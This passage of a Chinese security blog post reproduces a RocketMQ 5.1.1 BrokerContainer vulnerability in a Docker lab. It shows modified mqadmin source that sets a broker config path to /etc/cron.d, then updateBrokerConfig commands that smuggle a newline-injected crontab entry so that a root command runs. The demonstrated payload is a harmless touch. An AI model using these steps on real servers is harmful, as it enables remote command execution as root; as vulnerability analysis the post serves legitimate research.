<span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmq_test</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">tail</span> <span class="string">-f</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>启动环境之后，需要手动在BrokerContainer机器上开启cron</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service cron start</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="创建配置文件路径为计划任务的Broker"><a href="#创建配置文件路径为计划任务的Broker" class="headerlink" title="创建配置文件路径为计划任务的Broker"></a>创建配置文件路径为计划任务的Broker</h4><p>测试环境中启动mqbrokercontainer的时候是没有指定<code>brokerConfigPaths</code>的，所以默认只有brokercontainer服务，没有具体Broker。可以用<code>./mqadmin addBroker</code>启动一个Broker</p>
+<p>相关代码中存在如下逻辑：</p>
+<p>org.apache.rocketmq.container.BrokerContainerProcessor#addBroker</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">configPath</span> <span class="operator">=</span> requestHeader.getConfigPath();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (configPath != <span class="literal">null</span> &amp;&amp; !configPath.isEmpty()) &#123;</span><br><span class="line">    BrokerStartup.<span class="type">SystemConfigFileHelper</span> <span class="variable">configFileHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BrokerStartup</span>.SystemConfigFileHelper();</span><br><span class="line">    configFileHelper.setFile(configPath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        brokerProperties = configFileHelper.loadConfig();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        LOGGER.error(<span class="string">&quot;addBroker load config from &#123;&#125; failed, &#123;&#125;&quot;</span>, configPath, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] body = request.getBody();</span><br><span class="line">    <span class="keyword">if</span> (body != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">bodyStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(body, MixAll.DEFAULT_CHARSET);</span><br><span class="line">        brokerProperties = MixAll.string2Properties(bodyStr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果未指定<code>configPath</code>的话，将会从请求包中直接读取配置，然而<code>configPath</code>对于<code>mqadmin</code>的<code>addBroker</code>指令是必选项，而且无法自定义包体的内容</p>
+<blockquote>
+<p>usage: mqadmin addBroker -b <arg> -c <arg> [-h] [-n <arg>]<br>-b,–brokerConfigPath <arg>      Broker config path<br>-c,–brokerContainerAddr <arg>   Broker container address<br>-h,–help                        Print help<br>-n,–namesrvAddr <arg>           Name server address list, eg: ‘192.168.0.1:9876;192.168.0.2:9876’</p>
+</blockquote>
+<p>所以我们需要自己构造RocketMQ协议，或者直接修改<a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/releases/tag/rocketmq-all-5.1.1">源码</a>进行调用，这里我采用了后者：</p>
+<p>这条命令<code>./mqadmin addBroker -c host.docker.internal:10811 -b &#39;&#39;</code>其实也是调用Java，完整命令行参数如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/openjdk-8/bin/java -server -Xms1g -Xmx1g -Xmn256m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=128m -<span class="built_in">cp</span> .:/rocketmq-all-5.1.1-bin-release/bin/../conf:/rocketmq-all-5.1.1-bin-release/bin/../lib/*: -Drmq.logback.configurationFile=/rocketmq-all-5.1.1-bin-release/conf/rmq.tools.logback.xml org.apache.rocketmq.tools.command.MQAdminStartup addBroker -c host.docker.internal:10811 -b   </span><br></pre></td></tr></table></figure>
+
+
+
+<p>那么这样修改源码进行调用效果是一样的：</p>
+<p>org.apache.rocketmq.tools.command.MQAdminStartup#main</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//main0(args, null);</span></span><br><span class="line">    main0(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;addBroker&quot;</span>, <span class="string">&quot;-c&quot;</span> ,<span class="string">&quot;127.0.0.1:10811&quot;</span>, <span class="string">&quot;-b&quot;</span>,<span class="string">&quot;&quot;</span>&#125;,<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接着通过<code>request.setBody</code>添加包体：</p>
+<p>org.apache.rocketmq.client.impl.MQClientAPIImpl#addBroker</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemotingCommand</span> <span class="variable">request</span> <span class="operator">=</span> RemotingCommand.createRequestCommand(RequestCode.ADD_BROKER, requestHeader);</span><br><span class="line">request.setBody(</span><br><span class="line">        (<span class="string">&quot;brokerClusterName = DefaultCluster\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;brokerName = broker-a\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;brokerId = 0\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;deleteWhen = 04\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;fileReservedTime = 48\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;brokerRole = ASYNC_MASTER\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;flushDiskType = ASYNC_FLUSH\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;brokerConfigPath=/etc/cron.d/test\n&quot;</span>).getBytes());</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这样让远端BrokerContainer服务启动Broker成功后，默认端口是在6888，当然也可以在配置内容中指定端口</p>
+<h4 id="触发配置文件写入"><a href="#触发配置文件写入" class="headerlink" title="触发配置文件写入"></a>触发配置文件写入</h4><p>目前配置都在内存中，再一次通过<code>mqadmin</code>注入配置就可以将配置文件导出到对应路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k storePathRootDir -v <span class="string">&#x27;/tmp/store\n* * * * * root touch /tmp/success&#x27;</span> -b host.docker.internal:6888</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>还需要将value为空的配置进行数据填充</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./mqadmin updateBrokerConfig -k controllerAddr -v 127.0.0.1 -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k messageStorePlugIn -v <span class="built_in">test</span> -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsLabel -v <span class="built_in">test</span> -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsGrpcExporterHeader -v <span class="built_in">test</span> -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsGrpcExporterTarget -v <span class="built_in">test</span> -b host.docker.internal:6888</span><br><span class="line">./mqadmin updateBrokerConfig -k metricsPromExporterHost -v 127.0.0.1 -b host.docker.internal:6888</span><br></pre></td></tr></table></figure>
+
+
+
+<p>同样至多1分钟后，命令将被执行</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/RocketMQ/" rel="tag"># RocketMQ</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="Nacos Raft Hessian反序列化漏洞分析">
+                  <i class="fa fa-angle-left"></i> Nacos Raft Hessian反序列化漏洞分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="Grafana 历史漏洞分析">
+                  Grafana 历史漏洞分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
